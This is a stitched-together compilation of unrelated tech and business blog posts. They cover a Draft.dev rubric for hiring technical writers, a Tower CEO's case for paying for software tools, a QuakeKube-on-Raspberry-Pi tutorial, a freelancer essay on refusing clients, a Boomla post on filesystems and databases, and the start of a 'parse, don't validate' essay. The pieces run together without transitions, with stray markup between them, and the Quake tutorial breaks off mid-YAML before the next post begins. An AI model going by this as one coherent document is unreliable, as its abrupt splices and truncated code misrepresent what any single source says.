<p>As I started hiring more writers for <a href="https://draft.dev/">Draft.dev</a>, I began refining a rubric that would allow me to evaluate them quickly and objectively. Today, I’m sharing this rubric with you so you can use it as a starting point for creating your own hiring rubric.</p>

<p>Our rubric currently has ten attributes that fall within three broad categories. Each of these attributes has 3-4 levels we can use to compare writers. We use this rubric to decide which candidates to bring on during the hiring process and as an ongoing evaluation tool for our existing writers. This strategy helps us consistently provide high-quality technical work for our clients.</p>

<p>You can <a href="https://docs.google.com/spreadsheets/d/1ceZ5q510lDLGR8U3SFJdXEePAeaqARes_l6lmXBndms/edit?usp=sharing">get a copy of the rubric here</a> or read on for an explanation of how we evaluate writers using this rubric.</p>

<p><a href="https://docs.google.com/spreadsheets/d/1ceZ5q510lDLGR8U3SFJdXEePAeaqARes_l6lmXBndms/edit?usp=sharing"><img src="https://draft.dev/learn/assets/posts/hiring-rubric.png" alt="Hiring rubric for technical writers"></a></p>

<h3 id="category-1-writing">Category 1: Writing</h3>
<p>Writing skills are necessary for the kind of work we do at Draft.dev, but defining what it means to be a “good” writer is surprisingly hard. Many people use the, “I know it when I see it” test, but I’ve found that insufficient. There are three attributes I look for in strong writers.</p>

<h4 id="conventions">Conventions</h4>
<p>Grammar and spelling errors can be overcome. With tools like Grammarly, we can edit a writer with decent conventions, but submitting samples full of mistakes points to a problem with attention to detail. Every writer makes mistakes, but that doesn’t forgive sloppiness.</p>

<p>Writers who have mastered conventions will submit error-free work and may even spot mistakes in others’ work during the application process.</p>

<h4 id="language">Language</h4>
<p>English is a tough language to master. As such, many non-native writers will struggle to word things in a way that native readers find natural. For example, the phrase, “Let me explain you the reasons I believe this to be true,” is missing a preposition and somewhat strangely worded. It’s not glaringly incorrect, but it shows a deficiency in language that is common among inexperienced writers.</p>

<p>Writers who have strong language skills use engaging words, varied sentence structure, and stylistically sophisticated vocabulary that isn’t overly wordy. It’s tough to do.</p>

<h4 id="organization">Organization</h4>
<p>Finally, great writers have to be great organizers. While having <a href="https://draft.dev/learn/posts/content-plan">good content briefs with outlines</a> can help with higher-level structure, the writer will still have to decide how to present sequential information in a way that readers can grok.</p>

<p>To reach the highest level in this attribute, writers must create clear transitions between topics and consistent focus throughout the entire sample piece.</p>

<h3 id="category-2-technical">Category 2: Technical</h3>
<p>As a technical content agency, Draft.dev’s writers must have specialized experience. While not every piece we produce requires deep knowledge about a specific technical topic, writers must research, understand, and speak to technical topics.</p>

<h4 id="development">Development</h4>
<p>In this context, “development” doesn’t mean software development skills - it means the ability to develop and present an idea. A well-developed piece of writing goes beyond the step-by-step “how” and builds the “why” as well.</p>

<p>A writer who can present their main idea and strongly support it with technical evidence while keeping the “why” central to the work will get full points in this category.</p>

<h4 id="depth">Depth</h4>
<p>Technical depth describes the writer’s ability to go beyond entry-level writing on the topic at hand. Regurgitation of the “getting started” walkthrough is not that useful for the writing we do with our clients. Writers need to show that they understand the underlying technical justification for their decisions.</p>

<p>Writers who display depth of knowledge usually have years of real-world experience and knowledge of the technology’s inner-workings.</p>

<h4 id="demand">Demand</h4>
<p>Technical knowledge is spiky. A writer may know a lot about Rust, but nothing about Python, so while they can display depth by diving into the Rust compiler, if none of our clients need Rust writers, their skills aren’t in demand right now. While technical writers usually have two or three areas where they can contribute, their skills have to match up with our clients’ needs to be a good fit.</p>

<p>Writers with unique combinations of skills or experience that happens to match our clients’ technology stack will do the best in this category.</p>

<h4 id="correctness">Correctness</h4>
<p>Finally, writers must be technically correct. This is usually linked closely to depth - if a writer can’t go deep on a topic, they are less likely to get the details right - but not always. For example, a writer might create some sample code that doesn’t work even though their explanations are on-point.</p>

<p>Writers will get the most credit in this category when they have no factual errors, and all their assumptions are backed up with evidence or experience.</p>

<h3 id="category-3-work">Category 3: Work</h3>
<p>The last category is work habits. Even great writers who are technically qualified may be a bad fit for Draft.dev if they’re not consistent team players. Each of our writers works remotely as an independent contractor, so their ability to communicate, respond positively to feedback, and work independently are important to their success.</p>

<h4 id="communication">Communication</h4>
<p>While writing skills are evaluated in the first category, our writers must also be responsive, prompt communicators. With clients and writers around the world, we don’t have set “working hours,” but we require writers to respond to emails and requests for revisions within a reasonable amount of time.</p>

<p>The best writers proactively notify their editor with questions or delays as early as possible and communicate their progress along the way.</p>

<h4 id="attitude">Attitude</h4>
<p>As a writer, you have to be able to handle feedback - both positive and negative. Edits aren’t a personal attack, so we look for writers who actively seek out feedback. Great writers at Draft.dev enjoy the guidance we offer rather than seeing it as a burden.</p>

<h4 id="independence">Independence</h4>
<p>Finally, our technical writers have to be able to solve problems independently. This doesn’t mean they can’t ask questions - they should reach out proactively when stuck - but they should start projects early in case anything comes up.</p>

<p><em>“Should I buy this or not?”</em> Ever since the invention of money (and even before that), this very sensible question accompanies our buying decision. And of course not only for cars, handbags, and trampolines – but also when it comes to buying <strong>software tools</strong>.</p>



<p>I’m no expert when it comes to cars, handbags, and trampolines – but as the CEO and founder of “<a href="https://www.git-tower.com/?utm_source=sourcelevel&amp;utm_medium=guestpost&amp;utm_campaign=roi-of-software-tools">Tower</a>” (a desktop GUI for the Git version control system), I have both opinions and some expertise when it comes to SaaS software tools. Of course, my background in a small software company means that I’m highly biased in this matter! But I want to invite you to consider if my <em>arguments</em> might be true, independent of my own bias.</p>



<h2>The ROI of Software Tools is Almost Always Fantastic</h2>



<p>Here is my bold statement: in many cases, <strong>the return on investment is fantastic when it comes to software tools you use for your work</strong>. Let me tell you why I am so convinced that this is true.</p>



<h2>The Benefits of Good Software Tools</h2>



<p>Great software tools come with a host of benefits:</p>



<ol><li><strong>They make you more productive.</strong> For your private purposes, it might be enough if you keep track of tasks you have to do in a simple text file (or even on a piece of paper). But when it comes to your professional work – and especially in a team context – these overly simplistic solutions just won’t cut it. In our team, we are using “<a href="https://www.asana.com/">Asana</a>” to keep track of tasks and projects. And it would be so much harder and cost so much more time if we tried to do this manually! The same logic is true for a tool like “<a href="https://sourcelevel.io/">SourceLevel</a>“: instead of manually pulling together data from various sources, it helps you get a thorough overview of your Pull Request and Code Review metrics quicker and with less effort. <em>Not</em> using these tools – with the intention of trying to save a few bucks – very quickly backfires when it impairs your productivity (and more importantly: the productivity of your whole team)!</li><li><strong>They allow you to do things you couldn’t do without them.</strong> Our own product is a perfect example for this statement: <a href="https://www.git-tower.com/?utm_source=sourcelevel&amp;utm_medium=guestpost&amp;utm_campaign=roi-of-software-tools">Tower, the Git desktop GUI</a> that we make, helps developers to access advanced features of the Git version control system – which, due to the high complexity and steep learning curve of Git, they wouldn’t be able to use (or wouldn’t even be aware of) without Tower. Many software developers claim to know Git. But when it comes to more advanced features like Interactive Rebase, Submodules, or the Reflog, they either don’t know/ don’t use them – or they simply can’t use them efficiently. Anyone who has ever performed an Interactive Rebase operation, with its many manual steps, quickly comes to love Tower, where the same operation is possible via simple drag and drop!</li><li><strong>They reduce mistakes.</strong> I can vividly remember the stress and the anxiety I used to feel when I had to update our website: I would connect to our live server with an FTP program and replace some files with updated versions. This is the equivalent of open heart surgery, which means that a fair amount of stress is not surprising: there are a lot of things that can go wrong and cause a real mess! This whole scenario, for us, lies many years in the past and looks very different from how we do things today: for our marketing websites, we’re using a service called “<a href="https://deploybot.com/">Deploybot</a>” that makes this process a lot easier. And to run the build process for our main Tower app, we’re using the popular “<a href="https://travis-ci.org/">Travis CI</a>” service. Using both of these services (instead of doing things manually) has greatly reduced our error rate – and thereby saved us lots of hours of putting out fires.</li><li><strong>They free your time for more important work.</strong> As the CEO of a small tech company, my schedule is naturally pretty busy. And as anyone knows who has ever tried to find time on <em>multiple</em> people’s calendars: this is really time consuming work! Offering multiple alternative dates that block your calendar for days, looping in multiple people in multiple time zones, and all the back-and-forth emailing connected with this make these things a true nightmare. This is why I’m happily paying a hundred bucks for a yearly subscription of “<a href="https://calendly.com/">Calendly</a>” In a nutshell, this service allows me to share my availability and leave it to the other party / parties to pick a date and time that’s convenient for them. This completely takes away all of the ugly back-and-forth! And on top of that, it allows the other party to choose very freely and conveniently. This has freed up hours of my time that I can now use for more important work!</li></ol>



<hr>



<p>It’s hard to put a concrete dollar value to the above benefits. But if you think <em>any</em> of them through, you will quickly see that many software tools are a true bargain – they make you more productive, allow you to do things you couldn’t do without them, reduce mistakes, and free your time for more important work. All of this makes for a terribly great return on investment!</p>



<h2>Common Objections</h2>



<p>Let’s not ignore the haters, doubters, and nay-sayers and address some common objections.</p>



<blockquote><p>“It’s too expensive!”</p></blockquote>



<p>Let’s take our own tool, the “Tower” Git GUI, as an example.</p>



<ul><li>A license costs between 69 and 99 USD per user per year.</li><li>Our customers are professional software developers in companies large and small as well as freelance programmers.</li><li>The value that Tower delivers is that it makes software developers more productive: it helps them reduce mistakes and get access to the more advanced features that allow them to produce higher-quality software.</li></ul>



<p>The average software developer’s salary varies wildly, but it’s somewhere between 40,000 and 150,000 USD per year. The math here is very simple: if such a tool can help a developer save just <em>a couple of minutes</em> or prevent <em>just 1-2 errors</em> every month – by adding a meager 69 USD to that 40,000 USD yearly cost – the software tool has already paid for itself!</p>



<p>The same argument holds true for almost <em>any</em> knowledge worker: compared to the salaries of well-educated people, the costs of most software tools are extremely low, almost negligible. This means that they earn back their money very quickly! Either in productivity or any of the other benefits that I mentioned above.</p>



<blockquote><p>“I don’t need a tool for that.”</p></blockquote>



<p>It’s true: you <em>can</em> skin a potato with your bare hands and fingernails. But it’s just not very efficient. One reason why humankind has flourished over the millennia is because we have the ability to invent tools. And a potato peeler isn’t very different from a software tool like Tower: you’ll be more productive and get a better end result when using it!</p>



<p>I don’t doubt that you <em>can</em> do lots of things manually, without using a tool. But think carefully if, at least in some cases, there’s a chance that a tool could make things <em>easier</em> and <em>more productive</em>.</p>



<blockquote><p>“The free alternative is sufficient for me.”</p></blockquote>



<p>While you usually have to <em>pay</em> for a potato peeler, software tools are <em>sometimes</em> free: they might be Open Source, or a programmer’s hobby project, or they’re sponsored by a large corporation.</p>



<p>In some cases, such a free piece of software might indeed be an excellent choice (very often the case with Open Source projects). But more often than not, “free” will come with a price tag. Let’s take <strong>quality</strong> as an example: often, quality is not on par with paid alternatives. Why? Because quality costs an immense amount of time and money which both have to come from somewhere! Other examples are non-existent customer support or the lack of good documentation. All of these things, just like the overall “quality” aspect, cost time and money which are often not available in the case of free software.</p>



<blockquote><p>“My boss won’t pay for this.”</p></blockquote>



<p>Dear managers: I hope that reading this far has convinced you that it makes a ton of sense to cover expenses for software tools. If they make your employees just a tiny bit more productive – or if they make their lives a little bit easier – then covering expenses for tools should be a no-brainer. After all, <strong>our job as managers is to provide the people in our teams with everything they need to do good, productive work</strong>.</p>



<h2>A Look at Our Own “Household Spending”</h2>



<p>I started this post by admitting that I’m terribly biased: as CEO of a small software company, it’s probably no surprise that I encourage people to buy <em>our</em> software. However, I’m quite confident that I went beyond <em>our own</em> product and proved that the ROI of software tools <em>in general</em> is often very good.</p>



<p>To prove that we really “walk the walk” (and not just “talk the talk”), here’s an overview of the tools that we spend our own, hard-earned money on:</p>



<figure><img loading="lazy" width="686" height="1024" src="https://mk0sourcelevel699i08.kinstacdn.com/wp-content/uploads/overview-software-tools-686x1024.png" alt="" srcset="https://mk0sourcelevel699i08.kinstacdn.com/wp-content/uploads/overview-software-tools-686x1024.png 686w, https://mk0sourcelevel699i08.kinstacdn.com/wp-content/uploads/overview-software-tools-201x300.png 201w, https://mk0sourcelevel699i08.kinstacdn.com/wp-content/uploads/overview-software-tools-768x1146.png 768w, https://mk0sourcelevel699i08.kinstacdn.com/wp-content/uploads/overview-software-tools.png 842w" sizes="(max-width: 686px) 100vw, 686px"><figcaption>Software Tools Overtable</figcaption></figure>



<h2>It Goes Without Saying: Spend Wisely!</h2>



<p>Of course, all of the above does NOT mean that you should just spend, spend, spend! 💵 Like in other areas of life, you shouldn’t give in to every impulse and just buy any software tool that you come across.</p>



<p>But when it comes to <em>tools for your work</em>, I encourage you to keep your eyes just as much on the “return” part as on the “investment” of the “Return on Investment” consideration. <strong>Don’t hesitate to buy software that brings value!</strong> If it helps you and your team do your jobs better – in a more productive, easier, or safer way – then investing is probably much more clever than being overly frugal.</p>

<p>Yesterday I saw this tweet of Chris Campbell passing by in my timeline:</p>



<p>Aah, the memories. Quake III Arena, one of my favourite first-person shooter games.</p>

<p>Years ago, I spent (and lost) so much time playing this fast-paced game with friends and foes, and now it is brought into the world of containers and Kubernetes with <strong><a href="https://github.com/criticalstack/quake-kube" target="_blank">QuakeKube</a></strong> by <a href="https://twitter.com/CapitalOneTech" target="_blank">Capital One Tech</a>.</p>

<blockquote>
<p><em>QuakeKube is a Kubernetes-ified version of</em> <a href="https://github.com/inolen/quakejs" target="_blank"><em>QuakeJS</em></a> <em>that runs a dedicated</em> <a href="https://en.wikipedia.org/wiki/Quake_III_Arena" target="_blank"><em>Quake 3</em></a> <em>server in a Kubernetes Deployment, and then allow clients to connect via QuakeJS in the browser.</em></p>
</blockquote>

<p>Of course, I couldn’t wait to give it a try, especially after reading the documentation, saying:</p>

<blockquote>
<p><em>Container images are being cross-compiled with</em> <a href="https://docs.docker.com/buildx/working-with-buildx/" target="_blank"><em>Docker Buildx</em></a> <em>so it can run on hardware with different architectures and operating systems. Currently, it is building for <code>linux/amd64</code> and <code>linux/arm64</code>.</em></p>
</blockquote>

<p><strong>ARM64 support!</strong> Great, it means I can run it on one of my Raspberry Pis!</p>

<h2 id="let-s-get-fragging">Let’s get fragging!</h2>

<p>Most of the work is already done by others, so with the proper tools and projects, it will take you only a few minutes to get everything up and running.</p>

<h3 id="prerequisites">Prerequisites</h3>

<ul>
<li>a Raspberry Pi with Ubuntu 20.04, which supports arm64<br></li>
<li><code>k3sup</code>, a light-weight utility to get from zero to KUBECONFIG with k3s on any local or remote VM.<br></li>
<li><code>arkade</code>, a simple Golang CLI with strongly-typed flags to install charts and apps to your cluster in one command.<br></li>
<li><code>kubectl</code><br></li>
<li>a DigitalOcean account and an API Token</li>
</ul>

<h3 id="installation">Installation</h3>

<p>First, install <code>k3s</code> on your Raspberry Pi running a arm64 OS like Ubuntu 20.04</p>
<div><pre><code data-lang="bash">$ k3sup install --ip <span>192</span>.168.0.52 --user ubuntu --k3s-extra-args <span>'--no-deploy servicelb --no-deploy traefik'</span></code></pre></div>
<p>After the installation of k3s on the Raspberry Pi, k3sup also downloads the required kubeconfig file in your current working directory.<br>
Make sure to configure <code>kubectl</code> to use this config file:</p>
<div><pre><code data-lang="bash">$ export KUBECONFIG<span>=</span><span>$(</span>pwd<span>)</span>/kubeconfig</code></pre></div>
<p>Next, install the inlets-operator with <code>arkade</code>:</p>
<div><pre><code data-lang="bash">$ arkade install inlets-operator --provider digitalocean --token-file ~/do-api-token</code></pre></div>
<p>The inlets-operator will create an inlets exit-node on DigitalOcean, giving the LoadBalancer services in the private k3s cluster a public IP address.</p>

<p>As clients connect to the server via QuakeJS in the browser with websockets, the OSS version of inlets will do just fine. If you want to have better support for TLS etc, I can highly recommend having a look at inlets PRO version.</p>

<p>Finally, take the example yaml file from the QuakeKube GitHub repository and make the appropriate changes. The service should be updated to a LoadBalancer instead of type NodePort, and of course you can change the configuration to tweak the game preferences to your own needs.</p>

<p>Example of a QuakeKube yaml file:</p>
<div><pre><code data-lang="yaml">apiVersion: apps/v1

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article><blockquote>No, thank you. I can't work with you on your project. I prefer to dedicate my time on my own creative projects. Not that I don't find your project interesting, I know that focusing on my own business will make me happier in the long term. So I'm not taking any new clients. I would suggest you talk to my competent friends X or Y. I can set up an intro if you want.<br>I wish you the best,<p>- A courageous freelancer</p></blockquote><p>The opportunity costs calculations at play in this message: a missed short term gain but a rewarding long term choice.</p><p>‍</p><h2><strong>The two years mark</strong></h2><p>If someone is still freelancing after two years, they've passed a filter: they're good enough for new clients to come naturally, they like it enough to keep going, haven't burned out and they charge enough to make a living. In my experience, two years also marks a change of mindset: freelancers start refusing new work.</p><p>‍</p><h2>When to say yes</h2><p>Not so fast, cowboy. There are many reasons why getting new client work is a smart decision. It pays well. You build up a portfolio. You expand and accrue the benefits of a larger network. You practice what you learn. You gain authority. And you find more problems that you can solve through education or products (see the <a href="https://www.supercreative.design/blog/hyper-freelance" target="_blank">hyper freelance</a> model).</p><p>‍</p><h2><strong>Earning more because you care less</strong></h2><p>Here's the counterintuitive (and frankly irritating) thing that happens after the two years mark: someone pitches you a new project but you're not <em>really</em> interested.<br>So you increase your prices.<br>But the client accepts.<br>Wait. What?<br>People are willing to pay that price?<br>So you keep on charging more again. And that's how many freelancers stumble into the wonderful world of high prices™️, myself included. The less you want a new client, the more attractive you'll be, the higher you'll get paid.</p><figure id="w-node-5c826a3bcca3-8ff50e46"><p><img src="https://assets-global.website-files.com/5d768372d2b144cdff0dffed/5fbe7a040059199dbc8c730c_Formula%20stop%20clients.jpg" loading="lazy" alt="Saying no formula"></p></figure><p>The less you care, the more you're paid. When we let this idea suck in, it becomes in our best interest to diversify our businesses, create optionality and practice saying no more often.</p><p>‍</p><h2>When to say no</h2><p>Given the inherent inconsistency and variability of client work, accepting new projects is reassuring. But choosing to say yes or no to a new client is working with many unknowns: if they will pay, if they'll like the work, if <em>you</em>'ll like working with them, if you have the right skills, if they'll come back...</p><p>Accepting new clients is accumulating worries. It's deliberately accepting new weight on your cognitive load, highjacking your mental space. More emails to answer, documents to prepare, relationships to nurture. And at some point, the marginal mental cost of accepting a new client gets bigger than the financial benefit.</p><figure id="w-node-9d4735e89978-8ff50e46"><p><img src="https://assets-global.website-files.com/5d768372d2b144cdff0dffed/5fbe9d86f7f81f2049cc1226_Accepting%20new%20clients%20threshold%20graph.jpg" loading="lazy" alt=""></p></figure><p>David C. Baker says it best in his book <a href="https://www.davidcbaker.com/book-the-business-of-expertise" target="_blank"><em>The Business of Expertise</em></a>, saying no is how we position ourselves. It's how we double down on what we want. So if we want to become successful freelancers, saying no is a requirement.</p><p>It comes down to trading time to financial freedom. There's a point where trading time for money becomes sub-optimal. Since we have to start over for every new client, this doesn't look like wealth compounding to me, right <a href="https://twitter.com/naval/status/1002103360646823936?lang=en" target="_blank">Naval</a>?</p><p>‍</p><h2><strong>How to say no</strong></h2><p>Once we've reached the "<em>No" </em>threshold, we can still benefit from our reputation. Here are some options:</p><ul role="list"><li><strong>Giving back to a collective</strong>: By setting up or joining a collective, we can redirect projects to a network of freelancers. Easy to join, valuable in the long term but no financial upside.</li><li><strong>Delegating work</strong>: Hiring someone else to delegate the extra work we're not excited about is possible too. This isn't easy because our reputation is still on the line and we have to manage someone else. It's pretty common to see successful freelancers turn into mini agencies, just taking a percentage % for all projects and delegating to their own constellation of freelancer friends. That's the hard and risky option with high financial upside.</li><li><strong>Productizing our offer</strong>: Offering a fixed package in a fixed time scope instead. See my <a href="https://www.supercreative.design/helpline" target="_blank">Creative Helpline</a> offer as an example: two hours long consulting calls. When the call is over, my worries are too. That's one of the best option as we retain some of the benefits of consulting while living our professional life in our own terms.</li><li><strong>Redirecting to courses</strong>: When the clients wants the fish, explaining that learning how to fish is more better and actually possible with our own course, then that's a win-win situation. That does entail creating an educational product or course beforehand. But I can tell you from experience, it's awesome to turn a potential client into a student.</li><li><strong>Just saying no</strong>: The fastest option. Saying no to new client work takes courage: courage to face financial pressure, client dissatisfaction and believing in a better future. Upfront, quick and warm answers to potential clients might be the best thing for us and for them.<br>Baby, it's not you,<em> it's me.</em></li></ul><p>‍</p><figure id="w-node-ebd764d8e8fa-8ff50e46"><a href="https://www.supercreative.design/helpline" target="_blank"><p><img src="https://assets-global.website-files.com/5d768372d2b144cdff0dffed/5fbe7a25796bc010303e1fde_helpline%20no%20thank%20you.jpg" loading="lazy" alt="Creative Helpline Supercreative"></p></a></figure><p>‍</p><h2>COVID wakeup call</h2><p>The worldwide pandemic shattered a lot of client contracts. Get too attached to a big profitable client and we might in fact weaken our business (if you like that idea, read <a href="https://www.nateliason.com/notes/antifragile" target="_blank"><em>Antifragile</em></a>). For many freelancers, this might have been the <a href="https://www.indiehackers.com/interview/how-a-covid-19-lockdown-inspired-me-to-start-my-business-and-grow-it-22027589ad" target="_blank">wakeup call</a>. Not to blindly accept new work, but rather to consider new revenue streams. I know it was mine: I stopped taking clients and redirected all proposals to my <a href="https://www.supercreative.design/helpline" target="_blank">Creative Helpline</a>.</p><p>‍</p><p>For my French compatriots, this article was inspired by Cyrano. Here's the <a href="https://allpoetry.com/poem/9502587-The-Tirade-of-Non--merci--from-Cyrano-de-Bergerac-by-LunaLovegood" target="_blank">English translation</a>.</p><figure id="w-node-f33a798d6909-8ff50e46"><p><iframe allowfullscreen="true" frameborder="0" scrolling="no" src="https://www.youtube.com/embed/e_6VCPhDTIE"></iframe></p></figure><p>‍</p><p>This is the curse of freelancing: we're free to accept the clients whom we'll be slave to afterward. We need to carefully and regularly look after and nurture our freelance freedom. <br>We're just a client away from captivity.</p><p>No, thank you.</p><p>‍</p></article></div>]]>

<div data-o1-contenteditable="body" data-o1-contenteditable-format="html"><p>Traditional filesystems and databases have very different properties. Traditional filesystems are best suited for storing large objects while databases for structured data.

<div data-o1-contenteditable="body" data-o1-contenteditable-format="html"><p>As we are talking about an image <i>file</i>, it comes natural to store it on the traditional <b>filesystem</b>. Unfortunately, traditional filesystems don't support transactions. Getting the security aspects right is hard. It's a challenge to make consistent backups given that you can't just stop the world. Inevitably, a traditional filesystem will be modified while you are working on the backup. Sooner or later this will cause problems.</p><p><b>Databases</b> can solve all of the above. They have transactions. If you do a backup, it will likely be consistent by default. The problem is, databases are bad with large objects. They are a bad choice if you want to serve lots of users.</p><p>This is really frustrating. Why can't we have a storage system that combines the best of both worlds?</p><p>I want this:</p></div>

<div data-o1-contenteditable="body" data-o1-contenteditable-format="html"><h2>The problem space is cut along the wrong dimensions</h2><p>Let's take a step back and look at the big picture. This is how the problem space for storing data is currently divided:</p></div>

<div data-o1-contenteditable="body" data-o1-contenteditable-format="html"><p>The problem space should be divided along <i>conflicting requirements</i>.</p><p>For <b>example</b>, storing ice cream and fruits have conflicting requirements. Ice cream has to be frozen while freezing directly harms fruits. Ice cream requires below zero temperatures while fruits require above zero temperatures. That's a hard conflict. <i>They require different storage solutions.</i></p><p>The thing is, traditional filesystem and database features have no conflicts. Or tell me a single feature that requires:</p><ul><li><p>the <i>lack of </i><b>hierarchy</b> support,</p></li><li><p>the <i>lack of </i><b>large object</b> support,</p></li><li><p>the<i> lack of</i> <b>transaction</b> support, or</p></li><li><p>the<i> lack of</i> <b>structured data</b> support.</p></li></ul><p>There is none.

It often requires <b>version control</b> and <b>non-linear development</b> (branching and merging). Upon shipping a new version of the codebase to the production environment, the new state should<i> replace</i> the old state.</p><h3>Uncontrolled changes</h3><p>On the other hand, there are changes that simply <i>can not be controlled</i>. This includes user contributions like comments and webshop orders. It includes changes made by automatically executed scripts, for example one that resets counters at midnight. It shall include logs generated while serving requests.</p><p>Uncontrolled data consists of <b>linear, sequential changes</b> thus it requires linear snapshots not non-linear feature branches. When cloning the production environment for development purposes, uncontrolled data will typically need to be cloned as well thereby giving you complete freedom to try anything without a complex setup process. This also helps reproducing bugs in minimal time. Upon shipping a new version of the codebase to the production environment, the new state of uncontrolled data shall be typically <i>dropped</i> to prevent accidentally overwriting changes made in production.</p></div>

<div data-o1-contenteditable="body" data-o1-contenteditable-format="html"><h3>Eliminating global data</h3><p>We have addressed how to have a hierarchy of objects everywhere, even on the dynamic filesystem but if we store it as a separate filesystem tree, we are back to square one: a global shared namespace. Instead, what we need is the ability to <i>attach</i> dynamic volumes anywhere on the static filesystem, like so:</p></div>

</div></div>
<div data-o1-path="//boomla.com/blog/filesystem-and-database-are-not-cutting-the-problem-space-right/main/dynamic-volumes-attached-to-the-static-filesystem.png"><p><img src="https://cdn.boomla.net/v2.0/boomla.com/blog/filesystem-and-database-are-not-cutting-the-problem-space-right/main/dynamic-volumes-attached-to-the-static-filesystem.png?height=1024&amp;o1-cache=cb5a4070bc6&amp;width=1024" alt="Dynamic volumes attached to the Static Filesystem"></p></div>
<div data-o1-path="//boomla.com/blog/filesystem-and-database-are-not-cutting-the-problem-space-right/main/text-21"><div>




<div data-o1-contenteditable="body" data-o1-contenteditable-format="html"><p>The <i>existence</i> of these dynamic volumes must be version controlled but their contents must not be as they are constantly changing. They must be somehow stored on the dynamic filesystem instead.</p><p>Let's see an <b>example</b>. Imagine a comments element embedded into a page. It shall have its own dynamic volume with its own schema. The existence of the comments element must be version controlled but not the actual comments. They can't be: they would cause continuous merging issues.</p><p>Removing either the comments element itself (or even the page it is embedded in) must remove the comments element itself with all associated user comments. In the traditional setup, you would have to write lots of code yourself to figure out what data needs to be removed. This takes time (money) and may be non-trivial when there are several 3rd party plugins installed. With proper encapsulation, the system can automatically do this for you.</p></div>

<div data-o1-contenteditable="body" data-o1-contenteditable-format="html"><div><p>So here is how this works. Boomla files have a <i>link</i> property. You can attach a dynamic volume anywhere on your website's filesystem by simply setting the file's link property to <code>dynamic</code>.</p></div></div>

<div data-o1-path="//boomla.com/blog/filesystem-and-database-are-not-cutting-the-problem-space-right/main/text-25"><div>




<div data-o1-contenteditable="body" data-o1-contenteditable-format="html"><p>By doing so, the system will create a new volume on the hidden dynamic filesystem and map it to the linking file. (Using the linking file's file ID.) From that point on, you will be able to write the dynamic subtree as usual. It will appear as if it was part of your website's filesystem tree.</p><p>That way, in Boomla, deleting the page holding the comments will <i>also remove the actual comments</i>.</p><p>The root volume of the dynamic filesystem is hidden by design, it's not directly accessible. If you are interested, see the <a href="https://boomla.com/docs/how-it-works/anatomy-of-the-boomla-filesystem/file-link/dynamic-link">dynamic link docs</a> for more details.</p></div>

<div data-o1-contenteditable="body" data-o1-contenteditable-format="html"><h2>Undo, redo</h2><p>One of the really powerful features of the Boomla Filesystem is that undo/redo is available for the entire website. It <i>makes</i> us experiment. We can try things, we can fail and we can always undo. It's a huge boost to <i>dare to try</i>.</p><p>The great news is, <b>undo/redo will still be available</b> when collaboration is enabled.</p><p>There is a little caveat though. In the <b>production environment</b> you may have multiple users making changes. You definitely don't want to accidentally undo a comment or an order made by someone else. Plus in production, the static filesystem is read-only as you probably don't want your visitors to see your work-in-progress. Because of this, undo/redo is not available in the production environment (master branch).</p><p>Once you clone the production environment and thus create a <b>development branch</b>, undo/redo will be available for your entire website. Changes made to the static and dynamic filesystems are bundled in a single atomic transaction, creating a single undo point. That way, whatever changes you make, you will be able to use undo/redo.</p><p>To rephrase, you either don't have undo/redo at all (master branch) or you have undo/redo for your entire website (secondary branches).</p></div>

</div></div>
<div data-o1-path="//boomla.com/blog/filesystem-and-database-are-not-cutting-the-problem-space-right/main/text-8"><div>




<div data-o1-contenteditable="body" data-o1-contenteditable-format="html"><h2>Users, Access Control, Security</h2><p>Using a traditional filesystem and database poses another problem with access control.</p><p><b>Access control can only be enforced in a layer that has access to both users and data.</b> It's just impossible otherwise. Websites and web apps introduce their own user concepts. As a result, they should take over all access control responsibilities. Data access should only happen through a single, well defined layer.</p><p>Unfortunately, that didn't happen. Both databases and the underlying OS have their own user concepts with their own means of doing access control. Plus your chosen CMS or framework has its own user concept and access control mechanisms. Application developers have access to all of them. They have to call all the right functions themselves to make sure everything is secure. Every application developer has to be a security expert and not make mistakes.</p><p>If you are wondering how this could possibly be secure - don't worry, it isn't. <b>It's a complete disaster.</b> (Pro tip: make your competitors use this.)</p></div>

<p>There’s a fantastic article from last year titled <a href="https://lexi-lambda.github.io/blog/2019/11/05/parse-don-t-validate/">Parse, don’t validate</a>. I’d highly recommend it to any programmer (along with the more recent follow up <a href="https://lexi-lambda.github.io/blog/2020/11/01/names-are-not-type-safety/">Names are not type safety</a>). The basic idea is that there are two ways to check that some input to a function is valid:</p>



<ul><li>A <em>validator</em> checks that the input is valid and throws an error if not. It doesn’t return anything. For example, checking that a list is not empty. </li><li>A <em>parser</em> does the same as a validator, but returns a more specific representation of the input that ensures that the required property is satisfied. For example, checking that a list is not empty and <em>returning a NonEmptyList type</em>. </li></ul>



<p>The thesis of the article is that parsers are preferable to validators. If you’ve not read the original article, please do so – it’s very well written and makes the case much better than I can summarise it. The essential message is to <em>make illegal states unrepresentable</em>. In the article, this is done by making use of the type system. This is a philosophy I entirely agree with, but I want to point out and expand upon one ironic aspect of the argument:</p>



<p><strong><em>A type checker is a paradigmatic example of a validator!</em></strong></p>



<p>A type checker, after all, takes as input an already parsed program representation and rejects it if it fails to type-check. It doesn’t return a more specific representation of the program. (Not to be confused with <em>type inference</em>, which does return more information, but only about the types). </p>



<p>So what would be the parser alternative to a type checker in a programming language? One approach would be to actually create a more specific grammar that eliminates illegal states. For example, if a given function requires a number that must be between one and five, then rather than having a generic syntax for function calls such as:</p>



<pre>fun_call ::= fun_name ‘(‘ integer ‘)’</pre>



<p>You would instead define specific grammar rules for the functions you provide:</p>



<pre>one_to_five ::= 1 | 2 | 3 | 4 | 5<br>fun_call ::= ‘lil_fac(‘ one_to_five ‘)’<br>         | ... other function definitions ...</pre>



<p>Creating such specific grammars is one approach to crafting <em><a href="https://www.martinfowler.com/bliki/DomainSpecificLanguage.html">domain-specific languages</a> </em>(DSLs). And indeed, DSLs are a great way of ensuring that illegal states aren’t representable. Of course, this is not a scalable solution if you want to make a general-purpose language with user-defined functions.</p>



<p>An alternative to having a very specific grammar is to instead <em>raise the level of abstraction</em>, so that it is easier to avoid invalid states. For example, a common source of programming errors is out of bounds indexing into arrays. This occurs because the programming language only offers a primitive indexing operation: <code>a[x]</code>. Here “x” is an integer but might be out of bounds, resulting in an exception or crash (if you’re lucky). One way we could prevent this would be to define a more specific type of “integers between zero and 12” so that the type system rejects any potentially invalid indexing operations, and then track this more precise type for each array — validation again. </p>



